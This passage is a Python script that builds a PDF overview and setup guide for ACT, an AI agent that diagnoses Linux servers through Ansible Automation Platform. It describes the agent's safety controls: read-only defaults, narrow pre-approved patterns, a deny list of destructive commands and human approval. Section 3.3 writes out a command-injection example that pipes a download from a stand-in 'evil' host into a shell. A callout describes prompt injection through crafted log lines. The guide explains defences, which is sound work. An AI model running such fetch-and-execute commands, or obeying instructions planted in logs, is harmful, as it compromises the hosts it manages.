#!/usr/bin/env python3
"""Build "ACT Automated Triage" - an overview + setup guide PDF for ACT with AAP.

Rebuild after a release:  python3 build_guide.py [output.pdf]
Needs reportlab and the Noto Sans / Noto Sans Mono TTFs (Fedora: google-noto-sans-fonts)."""
import sys

from actpdf import *  # noqa: F401,F403 - shared fonts, styles, helpers, GuideDoc
from actpdf import _arrow, _box

OUT = sys.argv[1] if len(sys.argv) > 1 else "ACT-Automated-Triage-Guide.pdf"

def diagram_loop():
    W, H = CONTENT_W, 150
    d = Drawing(W, H)
    bw, bh, gap = 86, 70, (W - 5 * 86) / 4
    steps = [("1  Plan", ["reads the task,", "writes a step plan"]),
             ("2  Investigate", ["runs read-only", "commands (status,", "journal, config)"]),
             ("3  Fix?", ["pre-approved: runs", "otherwise: refused", "and reported"]),
             ("4  Verify", ["a read-only check", "must prove", "the fix worked"]),
             ("5  Report", ["summary + result", "file (JSON)"])]
    y = 58
    for i, (t, ls) in enumerate(steps):
        x = i * (bw + gap)
        fill = AMBER_L if i == 2 else (GREEN_L if i == 4 else TEAL_L)
        stroke = AMBER if i == 2 else (GREEN if i == 4 else TEAL)
        _box(d, x, y, bw, bh, t, ls, fill=fill, stroke=stroke, tcolor=NAVY)
        if i < 4:
            _arrow(d, x + bw + 2, y + bh / 2, x + bw + gap - 2, y + bh / 2, color=TEAL)
    # feedback loop from Verify back to Investigate
    x_inv = 1 * (bw + gap) + bw / 2
    x_ver = 3 * (bw + gap) + bw / 2
    d.add(Line(x_ver, y, x_ver, 22, strokeColor=MUTED, strokeWidth=1, strokeDashArray=[3, 2]))
    d.add(Line(x_ver, 22, x_inv, 22, strokeColor=MUTED, strokeWidth=1, strokeDashArray=[3, 2]))
    _arrow(d, x_inv, 22, x_inv, y - 2, color=MUTED, width=1)
    d.add(String((x_inv + x_ver) / 2, 10, "not verified yet, or more evidence needed: keep investigating",
                 fontName="Sans-Italic", fontSize=7.4, fillColor=MUTED, textAnchor="middle"))
    d.add(String(W / 2, H - 10, "Every step is bounded: at most 30 steps and 15 minutes per host (defaults)",
                 fontName="Sans-Italic", fontSize=7.6, fillColor=MUTED, textAnchor="middle"))
    return d


def diagram_decision():
    W, H = CONTENT_W, 228
    d = Drawing(W, H)
    cx = 180
    _box(d, cx - 120, H - 32, 240, 28, "The model proposes a command", [], fill=PANEL, stroke=NAVY)
    q1y = H - 92
    _box(d, cx - 110, q1y, 220, 36, "Proven read-only?", ["status, logs, config reads, disk usage"],
         fill=TEAL_L, stroke=TEAL, tsize=8.8)
    _arrow(d, cx, H - 32, cx, q1y + 38, color=NAVY)
    _box(d, W - 144, q1y + 1, 144, 34, "Runs", ["approval: auto"], fill=GREEN_L, stroke=GREEN, tcolor=GREEN)
    _arrow(d, cx + 112, q1y + 18, W - 146, q1y + 18, color=GREEN, label="yes")
    q2y = q1y - 66
    _box(d, cx - 150, q2y, 300, 42, "Matches one of YOUR pre-approved patterns?",
         ["and is one plain command, not danger tier, not a file edit"], fill=AMBER_L, stroke=AMBER,
         tsize=8.8)
    _arrow(d, cx, q1y, cx, q2y + 44, color=NAVY, label="no", lx=11, ly=-3)
    _box(d, W - 144, q2y + 4, 144, 34, "Runs, then verified", ["approval: pre_approved"], fill=GREEN_L,
         stroke=GREEN, tcolor=GREEN)
    _arrow(d, cx + 152, q2y + 21, W - 146, q2y + 21, color=GREEN, label="yes")
    ry = 6
    _box(d, cx - 130, ry, 260, 42, "Refused - NOT run", ["reported as a proposed fix (denied[])",
                                                        "the model finishes with its diagnosis"],
         fill=RED_L, stroke=RED, tcolor=RED, tsize=9)
    _arrow(d, cx, q2y, cx, ry + 44, color=NAVY, label="no", lx=11, ly=-3)
    _box(d, W - 144, ry + 4, 144, 34, "Approval workflow", ["a person approves;", "AAP applies exactly it"],
         fill=PANEL, stroke=NAVY, tsize=8.4, lsize=7.2)
    _arrow(d, cx + 132, ry + 21, W - 146, ry + 21, color=NAVY, label="later", ly=4)
    return d


def diagram_architecture():
    W, H = CONTENT_W, 262
    d = Drawing(W, H)
    # AAP column
    d.add(Rect(0, 20, 150, H - 30, rx=8, ry=8, fillColor=colors.white, strokeColor=NAVY, strokeWidth=1.1))
    d.add(String(75, H - 26, "Ansible Automation Platform", fontName="Sans-Bold", fontSize=8.2,
                 fillColor=NAVY, textAnchor="middle"))
    _box(d, 8, H - 80, 134, 42, "Job templates", ["ACT triage / ACT apply", "+ approval workflow"],
         tsize=8.2, lsize=7.1)
    _box(d, 8, H - 132, 134, 42, "Credential", ['"ACT model key"', "(never in playbooks)"], tsize=8.2,
         lsize=7.1)
    _box(d, 8, H - 184, 134, 42, "Project (Git)", ["ACT-Linux repo: act script,", "role, playbooks"],
         tsize=8.2, lsize=7.1)
    _box(d, 8, 30, 134, 40, "Outputs", ["job output, set_stats,", "report, notifications"], tsize=8.2,
         lsize=7.1, fill=GREEN_L, stroke=GREEN)
    # host column
    hx = 192
    d.add(Rect(hx, 20, 150, H - 30, rx=8, ry=8, fillColor=colors.white, strokeColor=TEAL, strokeWidth=1.1))
    d.add(String(hx + 75, H - 26, "Managed Linux host", fontName="Sans-Bold", fontSize=8.2, fillColor=TEAL,
                 textAnchor="middle"))
    _box(d, hx + 8, H - 80, 134, 42, "1  Cheap checks", ["failed units, disk,", "journal error count"],
         fill=TEAL_L, stroke=TEAL, tsize=8.2, lsize=7.1)
    _box(d, hx + 8, H - 150, 134, 52, "2  ACT", ["only if a check tripped", "/opt/act/act",
                                                "--non-interactive"],
         fill=AMBER_L, stroke=AMBER, tsize=8.2, lsize=7.1)
    _box(d, hx + 8, H - 210, 134, 40, "3  Result file", ["act.result/1 JSON"], fill=TEAL_L, stroke=TEAL,
         tsize=8.2, lsize=7.1)
    _arrow(d, hx + 75, H - 80, hx + 75, H - 96, color=TEAL, head=4)
    _arrow(d, hx + 75, H - 150, hx + 75, H - 168, color=TEAL, head=4)
    # endpoint
    ex = W - 106
    _box(d, ex, H - 158, 106, 68, "Model endpoint", ["GenAI.mil or", "AskSage", "(HTTPS)"], fill=PANEL,
         stroke=NAVY, tsize=8.4, lsize=7.3)
    # arrows between columns
    _arrow(d, 144, H - 59, hx + 6, H - 59, color=NAVY)
    d.add(String((144 + hx) / 2, H - 53, "SSH", fontName="Sans", fontSize=7, fillColor=MUTED,
                 textAnchor="middle"))
    _arrow(d, hx + 144, H - 116, ex - 2, H - 116, color=AMBER)
    d.add(String((hx + 144 + ex) / 2, H - 101, "prompt +", fontName="Sans", fontSize=6.8, fillColor=MUTED,
                 textAnchor="middle"))
    d.add(String((hx + 144 + ex) / 2, H - 110, "command output", fontName="Sans", fontSize=6.8,
                 fillColor=MUTED, textAnchor="middle"))
    _arrow(d, ex - 2, H - 132, hx + 144, H - 132, color=AMBER)
    d.add(String((hx + 144 + ex) / 2, H - 143, "next action", fontName="Sans", fontSize=6.8,
                 fillColor=MUTED, textAnchor="middle"))
    _arrow(d, hx + 6, H - 190, 144, 52, color=GREEN)
    d.add(String(171, 118, "result", fontName="Sans", fontSize=6.8, fillColor=MUTED, textAnchor="middle"))
    d.add(String(171, 110, "JSON", fontName="Sans", fontSize=6.8, fillColor=MUTED, textAnchor="middle"))
    d.add(String(W / 2, 5, "Healthy hosts stop after step 1: no model call, no cost.",
                 fontName="Sans-Italic", fontSize=7.6, fillColor=MUTED, textAnchor="middle"))
    return d


def diagram_workflow():
    W, H = CONTENT_W, 152
    d = Drawing(W, H)
    y, bh = 64, 58
    boxes = [
        (0, 82, "Trigger", ["schedule or", "EDA alert"], PANEL, NAVY),
        (112, 104, "ACT triage", ["job template", "diagnose-only"], TEAL_L, TEAL),
        (246, 108, "Approval node", ["a person reviews", "the outcome"], AMBER_L, AMBER),
        (384, 120, "ACT apply approved", ["runs exactly the", "proposed commands"], GREEN_L, GREEN),
    ]
    for x, w, t, ls, f, s_ in boxes:
        _box(d, x, y, w, bh, t, ls, fill=f, stroke=s_, tsize=8.6, lsize=7.3)
    _arrow(d, 84, y + bh / 2, 110, y + bh / 2, color=NAVY)
    _arrow(d, 218, y + bh / 2, 244, y + bh / 2, color=NAVY)
    _arrow(d, 356, y + bh / 2, 382, y + bh / 2, color=NAVY)
    d.add(String(369, y + bh / 2 + 5, "yes", fontName="Sans", fontSize=6.8, fillColor=MUTED,
                 textAnchor="middle"))
    d.add(Rect(112, 8, 392, 36, rx=5, ry=5, fillColor=colors.white, strokeColor=LINE, strokeWidth=0.8,
               strokeDashArray=[3, 2]))
    d.add(String(308, 30, "set_stats: act_triage -> { host: { status, summary, findings,",
                 fontName="Mono", fontSize=7.2, fillColor=INK, textAnchor="middle"))
    d.add(String(308, 19, "proposed_commands, manual_fixes } }", fontName="Mono", fontSize=7.2,
                 fillColor=INK, textAnchor="middle"))
    _arrow(d, 164, y, 164, 46, color=MUTED, width=0.9, head=4)
    _arrow(d, 444, 46, 444, y - 2, color=MUTED, width=0.9, head=4)
    d.add(String(W / 2, H - 8, "AAP carries the triage results to later workflow nodes as extra vars",
                 fontName="Sans-Italic", fontSize=7.6, fillColor=MUTED, textAnchor="middle"))
    return d


def diagram_rollout():
    W, H = CONTENT_W, 118
    d = Drawing(W, H)
    phases = [("Phase 1", "Pilot", ["diagnose-only", "a few test hosts", "run by hand"], TEAL_L, TEAL),
              ("Phase 2", "Scheduled reports", ["diagnose-only", "wider group", "notifications"], TEAL_L,
               TEAL),
              ("Phase 3", "Approval workflow", ["triage > approve", "> apply", "person in the loop"],
               AMBER_L, AMBER),
              ("Phase 4", "Narrow auto-fixes", ["pre-approved", "low-risk fixes only", "reviewed monthly"],
               GREEN_L, GREEN)]
    bw, gap = 112, (W - 4 * 112) / 3
    for i, (p, t, ls, f, s) in enumerate(phases):
        x = i * (bw + gap)
        d.add(Rect(x, 10, bw, 88, rx=7, ry=7, fillColor=f, strokeColor=s, strokeWidth=1))
        d.add(String(x + bw / 2, 82, p.upper(), fontName="Sans-Bold", fontSize=7.2, fillColor=s,
                     textAnchor="middle"))
        d.add(String(x + bw / 2, 68, t, fontName="Sans-Bold", fontSize=9, fillColor=NAVY,
                     textAnchor="middle"))
        for j, ln in enumerate(ls):
            d.add(String(x + bw / 2, 50 - j * 11, ln, fontName="Sans", fontSize=7.6, fillColor=INK,
                         textAnchor="middle"))
        if i < 3:
            _arrow(d, x + bw + 3, 54, x + bw + gap - 3, 54, color=NAVY)
    d.add(String(W / 2, H - 8, "Move to the next phase only when the exit criteria are met",
                 fontName="Sans-Italic", fontSize=7.6, fillColor=MUTED, textAnchor="middle"))
    return d


# ---------------------------------------------------------------------------- content
story = []
story.append(Spacer(1, 3.55 * inch))
story.append(Paragraph(md(
    "**What this guide covers.** ACT is a command-line AI agent that investigates problems on a "
    "server the way an engineer would: it runs real commands, reads the output, and explains the "
    "root cause. Version %s adds what is needed to run it safely from automation. This guide "
    "explains what it is, how its safety model works, how it plugs into Ansible Automation "
    "Platform (AAP), how to set it up, and what to expect, with worked examples." % VERSION), ST["lead"]))
story.append(space(6))
cover_rows = [
    ["**For decision makers**", "Section 1 (at a glance), 3 (safety), 8 (rollout plan), 9 (FAQ), "
                                "10 (current status and limits)"],
    ["**For engineers**", "Section 2 (how it works), 4 (AAP integration), 5 (what to expect), "
                          "6 (setup), 7 (examples), appendices"],
]
t = Table([[Paragraph(md(a), ST["cell"]), Paragraph(md(b), ST["cell"])] for a, b in cover_rows],
          colWidths=[CONTENT_W * 0.26, CONTENT_W * 0.74])
t.setStyle(TableStyle([("BACKGROUND", (0, 0), (-1, -1), PANEL), ("BOX", (0, 0), (-1, -1), 0.5, LINE),
                       ("LINEBELOW", (0, 0), (-1, 0), 0.4, LINE), ("VALIGN", (0, 0), (-1, -1), "TOP"),
                       ("TOPPADDING", (0, 0), (-1, -1), 6), ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
                       ("LEFTPADDING", (0, 0), (-1, -1), 8)]))
story.append(t)
story.append(NextPageTemplate("content"))
story.append(PageBreak())

# ---- contents
story.append(Paragraph("Contents", ST["tochead"]))
toc = TableOfContents()
toc.levelStyles = [ST["toc1"], ST["toc2"]]
toc.dotsMinLevel = 0
story.append(toc)
story.append(PageBreak())

# ============================================================================ 1. At a glance
story += section("1. At a glance", [P(
    "**ACT** (Agentic Command Tool) is a command-line assistant backed by the GenAI.mil or AskSage "
    "models. Given a task such as \"nginx is down, find out why\", it plans, runs commands on the host, "
    "reads the results, and reports the root cause. It can also apply a fix, but only under strict rules "
    "you control.", "lead")])
story.append(H2("The problem it solves"))
story.append(P(
    "Today an alert fires, an engineer logs in, and most of the time goes to the first pass: checking "
    "unit status, reading logs, looking at disk and config, working out what actually broke. ACT does "
    "that first pass automatically and hands the engineer a diagnosis with evidence and a proposed fix, "
    "or applies a fix you have explicitly pre-approved and verifies it worked."))
story.append(H2("How it fits Ansible Automation Platform"))
story += bullets([
    "AAP runs quick, deterministic health checks on every host (failed services, disk usage, journal "
    "error counts). **Healthy hosts never call the AI** and cost nothing.",
    "Only on hosts where a check trips does AAP run ACT, which investigates and writes a structured "
    "result file.",
    "AAP collects the results into a fleet report and, in a workflow, pauses at an **approval step**. "
    "A person approves, and AAP applies exactly the fixes ACT proposed, then ACT verifies them.",
])
story.append(callout("good", "Three guardrails", [
    "**1. Diagnose-only by default.** Unattended ACT runs only proven read-only commands. Anything that "
    "would change the host is refused and reported as a proposed fix.",
    "**2. Only fixes you pre-approve can run unattended**, as exact command patterns, and only if each is "
    "one plain command. Dangerous commands (recursive deletes, disk tools, firewall, reboot) and file "
    "edits can never be pre-approved.",
    "**3. A person approves everything else**, through an AAP approval node. Every run leaves a result "
    "file, and AAP keeps the job log and the approval record.",
]))
story.append(H2("What it needs"))
story.append(table(["", "Requirement"], [
    ["Hosts", "Linux with systemd and Python 3.8+ (RHEL 8: install `python3.11` alongside the default). "
              "ACT itself is one script the automation copies in: no agent, no daemon."],
    ["Network", "Each host must reach the model endpoint (GenAI.mil or AskSage) over HTTPS."],
    ["AAP", "A project pointing at the ACT-Linux repository, one custom credential type for the model "
            "key, two job templates, and one workflow."],
    ["People", "An owner for the pre-approved fix list and approvers for the workflow."],
], [0.16, 0.84], bold_first=True))
story.append(space(10))
story.append(callout("warn", "What it is not", [
    "Not autonomous root access: without pre-approved patterns it cannot change anything unattended.",
    "Not a replacement for monitoring: it acts on alerts and checks, it does not watch hosts itself.",
    "Not offline: prompts, including command output such as log lines, go to the model endpoint "
    "(see section 3.5).",
]))

# ============================================================================ 2. How ACT works
story += section("2. How ACT works", [P(
    "ACT works in a loop. The model never touches the host directly: it proposes one action at a time, "
    "and ACT decides whether that action may run, runs it, and feeds the output back."),
    figure(diagram_loop(), "Figure 1. The ACT loop for one task on one host")])
story.append(H2("The steps"))
story += numbered([
    "**Plan.** The model reads the task and writes a short plan (for example: check unit status, read "
    "the journal, check the config, fix, verify).",
    "**Investigate.** It runs read-only commands such as `systemctl status`, `journalctl -u`, `df`, and "
    "reading config files, and reads the real output.",
    "**Fix?** If it wants to change something, ACT checks the command against the safety rules "
    "(section 3). A pre-approved fix runs. Anything else is refused, and the model is told so.",
    "**Verify.** ACT does not accept \"done\" on the model's word. After a change, a separate read-only "
    "check has to prove the fix worked (for example `systemctl is-active nginx` printing `active`).",
    "**Report.** The model finishes with a summary in a fixed shape: ROOT CAUSE, EVIDENCE, FIX, "
    "CONFIDENCE. ACT writes everything that happened to the result file.",
])
story.append(H2("The result file: one JSON per run"))
story.append(P(
    "Automation never parses ACT's screen output. Each run writes one JSON file (schema `act.result/1`) "
    "that AAP, scripts and dashboards read. Its most important field is `status`:"))
story.append(table(["status", "exit code", "what it means"], [
    ["`completed`", "0", "Finished. Any fix it applied was verified."],
    ["`needs_approval`", "4", "It diagnosed the problem, but the fix needs a person. The proposed fix "
                              "is in `denied[]`."],
    ["`stopped`", "4", "It ran out of steps or kept going in circles. `stop_reason` says why."],
    ["`error`", "2 or 3", "2 = setup problem (no key, bad pattern); 3 = model/API problem. Nothing "
                          "changed."],
    ["`cancelled`", "4 / 130", "Interrupted (ESC or Ctrl-C)."],
], [0.2, 0.12, 0.68]))
story.append(space(6))
story.append(P(
    "The file also lists every command that ran and how it was approved (`auto`, `pre_approved` or "
    "`operator`), every refused action with the model's reasoning, any files changed, and a `changed` "
    "flag that AAP shows as \"changed\". **Command output is never stored in it**, because output can "
    "contain secrets. The summary carries the findings."))

# ============================================================================ 3. Safety model
story += section("3. Safety model", [H2("3.1 The four modes"), table(
    ["mode", "how it is started", "what runs without a person", "use"], [
        ["Interactive", "`act \"task\"`", "Proven read-only commands; everything else asks.",
         "An engineer at a terminal."],
        ["**Diagnose-only**", "`act --non-interactive`", "Proven read-only commands. **Everything else is "
                                                          "refused and reported.**",
         "Unattended triage. The default for automation."],
        ["**Allowlist fix**", "`--non-interactive --allow 'PATTERN'`", "Read-only commands **plus** commands "
                                                                         "matching your patterns.",
         "Unattended fixes for known, low-risk problems."],
        ["Auto", "`act --auto`", "Almost everything.", "**Never in automation.** The role does not expose it."],
    ], [0.16, 0.25, 0.34, 0.25])])
story.append(H2("3.2 How each proposed command is decided"))
story.append(figure(diagram_decision(), "Figure 2. The decision for every command the model proposes "
                                        "in an unattended run"))
story.append(H2("3.3 What can never run unattended"))
story.append(P("Even a pattern that matches everything (`.*`) cannot pre-approve:"))
story += bullets([
    "anything chained or piped, or with substitution, redirection, wildcards or quotes (`;` `&&` `|` "
    "`$(...)` `>` `*` `'`). So `systemctl restart .*` can never turn into "
    "`systemctl restart x; curl evil | sh`;",
    "anything in ACT's **danger tier**: recursive or forced deletes (`rm -rf`, `rm -f`, `find -delete`), "
    "disk and partition tools, firewall changes, reboot/shutdown, recursive ownership changes on "
    "system directories;",
    "any structured file edit or write.",
])
story.append(P("These always come back as proposals for a person."))
story.append(H2("3.4 Pre-approved patterns"))
story.append(P(
    "A pattern is a regular expression that must match the **whole** command. Keep them short and "
    "specific: one pattern per kind of fix, naming the exact service or path."))
story.append(table(["goal", "good pattern", "too broad"], [
    ["Restart the web tier", "`systemctl restart (nginx|httpd)`", "`systemctl .*`"],
    ["Clear a failed unit", "`systemctl reset-failed [a-z0-9@._-]+\\.service`", "`systemctl reset-failed.*`"],
    ["Trim the journal", "`journalctl --vacuum-(size=[0-9]+M|time=[0-9]+d)`", "`journalctl .*`"],
    ["Fix SELinux labels on the web root", "`restorecon -Rv /var/www/html`", "`restorecon .*`"],
    ["Step the clock", "`chronyc makestep`", "`chronyc .*`"],
], [0.28, 0.44, 0.28]))
story.append(space(8))
story.append(H2("3.5 Data, keys and audit"))
story += bullets([
    "**What leaves the host:** the task and the output of the commands ACT runs (log lines, config "
    "snippets) are sent to the configured model endpoint. From ACT 0.6.18, host names, IP addresses, "
    "user names and e-mail addresses in them are replaced with placeholders first (best effort: a "
    "short name ACT cannot recognize is sent as written). Confirm what that endpoint is "
    "approved to receive before pointing ACT at hosts with sensitive data.",
    "**Keys:** stored as an AAP credential, injected into the job's execution environment, and handed "
    "to ACT on each host only on the task's stdin with Ansible `no_log` (from ACT 0.6.21; never on a "
    "command line, so not in `ps` or the host's sudo log). They never appear in playbooks, "
    "variables or job output.",
    "**Audit trail:** the result file for every run, an optional step-by-step audit log "
    "(`--audit-log`), the AAP job output, and the AAP approval record.",
])
story.append(callout("risk", "Logs are untrusted input", [
    "A crafted log line can try to give the model instructions (\"prompt injection\"). In diagnose-only "
    "mode this cannot change anything. With pre-approved patterns, the most it can do is steer ACT "
    "toward commands your patterns already permit, which is why patterns must stay narrow.",
]))

# ============================================================================ 4. AAP integration
story += section("4. How it works with AAP", [P(
    "The ACT-Linux repository ships an Ansible role, `act_triage`, and two playbooks. AAP runs them "
    "like any other content: a project, job templates, credentials, and a workflow."),
    figure(diagram_architecture(), "Figure 3. Components and data flow for one triage job")])
story.append(H2("4.1 One triage job, step by step"))
story += numbered([
    "AAP connects to each host over SSH with privilege escalation, as for any playbook.",
    "The role runs **cheap checks**: failed systemd units, required units, filesystem usage, and the "
    "number of error-priority journal lines in the last hour.",
    "**If nothing tripped**, the host is reported healthy. No AI call is made.",
    "Otherwise the role copies the `act` script to `/opt/act/act`, finds a Python 3.8+ interpreter, "
    "and runs ACT in diagnose-only mode (plus any pre-approved patterns) with a prompt built from "
    "the findings.",
    "ACT investigates, talking to the model endpoint over HTTPS, and writes its result file.",
    "The role reads the result back, prints an `ACT | outcome` summary for each host, publishes the "
    "results with `set_stats`, and removes the result file from the host.",
    "The role writes one fleet report covering every host in the run.",
])
story.append(H2("4.2 The approval workflow"))
story.append(figure(diagram_workflow(), "Figure 4. Triage, approve, apply"))
story += bullets([
    "The triage job publishes each host's outcome. `proposed_commands` are fixes ACT could run "
    "unattended once approved (plain single commands). `manual_fixes` are everything else: file "
    "edits, chained or quoted commands, and danger-tier commands.",
    "The approver opens the triage job output, reads each host's diagnosis and proposed fix, and "
    "approves or denies.",
    "On approval, the apply job turns each approved command into an exact-match pattern. ACT re-checks "
    "that the problem still exists, runs the command, and verifies the result. Hosts with nothing "
    "approved are skipped.",
    "`manual_fixes` are never applied automatically. They stay in the report for a person.",
])
story.append(H2("4.3 What each AAP object does"))
story.append(table(["AAP object", "purpose"], [
    ["Project", "Syncs the ACT-Linux repository (act script, role, playbooks). Hosts download nothing "
                "themselves."],
    ["Credential type **ACT model key**", "Holds the GenAI and/or AskSage key and injects it as an "
                                          "environment variable in the execution environment."],
    ["Job template **ACT triage**", "Runs `ansible/playbooks/act_triage.yml`: checks everywhere, ACT "
                                     "where needed, results and report."],
    ["Job template **ACT apply approved**", "Runs `ansible/playbooks/act_apply_approved.yml`: applies "
                                             "exactly the approved `proposed_commands`."],
    ["Workflow **ACT triage + approve + fix**", "Chains triage, an approval node, and apply."],
    ["Schedule / Event-Driven Ansible", "Runs the workflow hourly or nightly, or when monitoring fires "
                                         "an alert."],
    ["Notifications", "Tells approvers a decision is waiting, and reports failures."],
], [0.34, 0.66], bold_first=False))

# ============================================================================ 5. What to expect
story += section("5. What to expect", [P(
    "The outputs below are **examples** of what the role produces. Host names are placeholders and "
    "the diagnoses are illustrative.")])
story.append(H2("5.1 In the AAP job output"))
story.append(P("Each triaged host ends with an `ACT | outcome` task, for example:"))
story.append(code("""
ok: [web01] => {
    "msg": {
        "status": "needs_approval",
        "summary": "ROOT CAUSE: php-fpm was killed by the OOM killer at 02:14 during a traffic
                    spike; memory is normal now. EVIDENCE: journalctl -u php-fpm shows 'Killed
                    process ... (php-fpm)'; free -m shows 5.1 GiB available. FIX: systemctl
                    restart php-fpm (not applied: needs approval). CONFIDENCE: high",
        "proposed_fixes": ["systemctl restart php-fpm"],
        "manual_fixes": [],
        "commands_run": 7
    }
}
""", "Example: AAP job output for one host"))
story.append(P(
    "Hosts that passed every check show only the checks, ending in `all checks passed`. An ACT run "
    "that exits 4 makes Ansible print `ASYNC FAILED` on the run task. That is expected: the role reads "
    "the real outcome from the result file."))
story.append(H2("5.2 The fleet report"))
story.append(P("One Markdown report per run, for example:"))
story.append(table(["Host", "Status", "Changed", "Findings", "Proposed fixes"], [
    ["web01", "**needs_approval**", "no", "1", "1"],
    ["web02", "**completed**", "yes", "1", "0 (pre-approved restart applied and verified)"],
    ["db01", "**needs_approval**", "no", "1", "1 (apply by hand)"],
    ["app01", "healthy", "no", "0", "0"],
], [0.13, 0.2, 0.12, 0.13, 0.42]))
story.append(space(6))
story.append(P(
    "Each triaged host then gets its own section: the checks that tripped, ACT's summary, the proposed "
    "fixes (split into *awaiting approval* and *apply by hand*), and a table of every command ACT ran "
    "with how it was approved and its exit code. For `db01` above, the fix was to delete old log files. "
    "Deletion is danger tier, so it appears under *apply by hand* and the workflow will not run it."))
story.append(H2("5.3 A result file (excerpt)"))
story.append(code("""
{
  "schema": "act.result/1",
  "act_version": "0.6.21",
  "platform": "linux",
  "host": "web01",
  "status": "needs_approval",
  "exit_code": 4,
  "summary": "ROOT CAUSE: php-fpm was killed by the OOM killer ... CONFIDENCE: high",
  "changed": false,
  "commands": [
    {"command": "systemctl status php-fpm --no-pager", "risk": "safe", "approval": "auto",
     "pattern": null, "exit_code": 3, "duration_ms": 41, "timed_out": false,
     "background": false, "read_only": true}
  ],
  "denied": [
    {"kind": "command", "command": "systemctl restart php-fpm", "risk": "mutating",
     "reason": "systemd service/unit change", "thought": "memory is back to normal; restart",
     "pre_approvable": true}
  ],
  "files_changed": [],
  "pre_approved_patterns": []
}
""", "Example: result file excerpt (full specification in docs/RESULT_FILE.md)"))
story.append(H2("5.4 Realistic expectations"))
story += bullets([
    "**Cost follows problems, not fleet size.** Healthy hosts make no model calls. Each triage is "
    "bounded by default to 30 steps and 15 minutes. Tune the journal threshold so normal noise does "
    "not trip it.",
    "**The model can be wrong.** That is why unattended runs are diagnose-only by default, fixes need "
    "approval or a narrow pre-approval, and every fix must pass a read-only verification. Diagnoses "
    "come with evidence and a confidence level so the approver can judge them.",
    "**Some runs end `stopped`** when a problem is too broad for the step budget. The partial findings "
    "are still reported.",
])

# ============================================================================ 6. Setup
story += section("6. Setup, step by step", [H2("6.1 Before you start"), table(["", "check"], [
    ["1", "Hosts have Python 3.8+ (`python3 --version`). On RHEL 8: `dnf install -y python3.11`. The "
          "role finds it automatically."],
    ["2", "Hosts can reach the model endpoint over HTTPS. Test from one host before rolling out."],
    ["3", "You have a GenAI.mil or AskSage API key for automation use."],
    ["4", "AAP execution environments with ansible-core 2.14 or newer."],
    ["5", "You have agreed who owns the pre-approved pattern list and who approves fixes."],
], [0.06, 0.94])])
story.append(H2("6.2 Step 1: Project"))
story.append(P(
    "*Resources > Projects > Add*. Source control type **Git**. URL: the ACT-Linux repository (or an "
    "internal mirror). Branch or tag: `v0.6.21`. Sync it. (Menu names differ slightly between AAP 2.4 "
    "and 2.5+; the objects are the same.)"))
story.append(H2("6.3 Step 2: Credential type for the model key"))
story.append(P("*Administration > Credential Types > Add* (AAP 2.5+: *Automation Execution > "
               "Infrastructure > Credential Types*). Name: **ACT model key**."))
story.append(code("""
# Input configuration
fields:
  - id: genai_key
    type: string
    label: GenAI API key
    secret: true
  - id: asksage_key
    type: string
    label: AskSage API key
    secret: true
""", "Input configuration"))
story.append(code("""
# Injector configuration
env:
  GENAI_KEY: "{{ genai_key }}"
  ASKSAGE_API_KEY: "{{ asksage_key }}"
""", "Injector configuration"))
story.append(H2("6.4 Step 3: Credentials and inventory"))
story += bullets([
    "*Credentials > Add*, type **ACT model key**: paste the key(s).",
    "Your usual **Machine** credential with SSH access and privilege escalation. The playbooks use "
    "`become: true` because the journal and any fix need root.",
    "Your normal inventory. No changes are needed.",
])
story.append(H2("6.5 Step 4: Job template \"ACT triage\""))
story += bullets([
    "Playbook: `ansible/playbooks/act_triage.yml`. Credentials: Machine + ACT model key.",
    "Extra variables, for example:",
])
story.append(code("""
act_triage_units: [nginx, php-fpm]        # units that must be running
act_triage_journal_error_threshold: 100   # error lines per hour that count as a finding
# AskSage instead of GenAI:
# act_triage_env: {ACT_PROVIDER: asksage, ASKSAGE_MODEL: gpt-4.1-gov}
""", "Extra variables (example)"))
story += bullets([
    "Optional **survey**: a *Textarea* question with variable name `act_triage_allow_lines` for the "
    "fix patterns ACT may run unattended, one per line. Leave it empty for diagnose-only. In a "
    "workflow, use this survey variable rather than `act_triage_allow`, because extra vars flow to "
    "every node and `act_triage_allow` would override the apply job's exact patterns.",
    "Launch it once by hand against a test group and read the `ACT | outcome` lines.",
])
story.append(H2("6.6 Step 5: Job template \"ACT apply approved\""))
story.append(P("Playbook: `ansible/playbooks/act_apply_approved.yml`. Same credentials. No survey."))
story.append(H2("6.7 Step 6: Workflow with an approval node"))
story += numbered([
    "*Templates > Add workflow template*: **ACT triage + approve + fix**.",
    "In the visualizer: start with **ACT triage**, then *On success* add an **Approval** node "
    "(\"Apply ACT's proposed fixes?\", with a timeout if you want one), then *On approve* add **ACT "
    "apply approved**.",
    "Give the approval node's role (Approve) to your approvers.",
])
story.append(P(
    "Approval is all-or-nothing for a workflow run. To approve per host group, run the workflow with a "
    "limit per group, or keep critical hosts in their own workflow."))
story.append(H2("6.8 Step 7: Schedule and notifications"))
story += bullets([
    "*Schedules > Add* on the workflow (for example hourly at :05), or on the triage template alone for "
    "report-only runs.",
    "Attach a notification template (email, Teams or Slack webhook) for *Approval* and *Failure* events "
    "so approvers know a decision is waiting.",
    "The report file lives in the job's execution environment, which is discarded. Use the job output "
    "and the `set_stats` data, or add a task that mails the report.",
])
story.append(H2("6.9 Optional: trigger from monitoring (Event-Driven Ansible)"))
story.append(P("Enable **Prompt on launch > Limit** on the workflow, then use a rulebook like this "
               "template (adapt the event source and the host label to your monitoring):"))
story.append(code("""
- name: ACT triage on alert
  hosts: all
  sources:
    - ansible.eda.alertmanager:
        host: 0.0.0.0
        port: 5000
  rules:
    - name: A node alert is firing
      condition: event.alert.status == "firing"
      action:
        run_workflow_template:
          name: ACT triage + approve + fix
          organization: Default
          job_args:
            limit: "{{ event.alert.labels.hostname }}"
""", "Template: EDA rulebook (not yet tested)"))
story.append(H2("6.10 Without AAP"))
story += bullets([
    "**Ansible CLI:** `ANSIBLE_ROLES_PATH=ansible/roles ansible-playbook -i inventory "
    "ansible/playbooks/act_triage.yml -e target=web` with the key in `GENAI_KEY` (or "
    "`ASKSAGE_API_KEY`).",
    "**One server, no Ansible:** `examples/act-healthcheck.sh` with the provided systemd timer runs the "
    "same checks hourly and leaves result, report and audit files in `/var/log/act-health`.",
    "**By hand:** `sudo act --non-interactive --result-file /tmp/r.json \"nginx is down, find out "
    "why\"`.",
])
story.append(P("The step-by-step details are in `docs/AUTOMATION_GUIDE.md` in both repositories."))

# ============================================================================ 7. Examples
story += section("7. Examples and use cases", [P(
    "Each example below shows when to use it, how to run it, and what you will see. Start every "
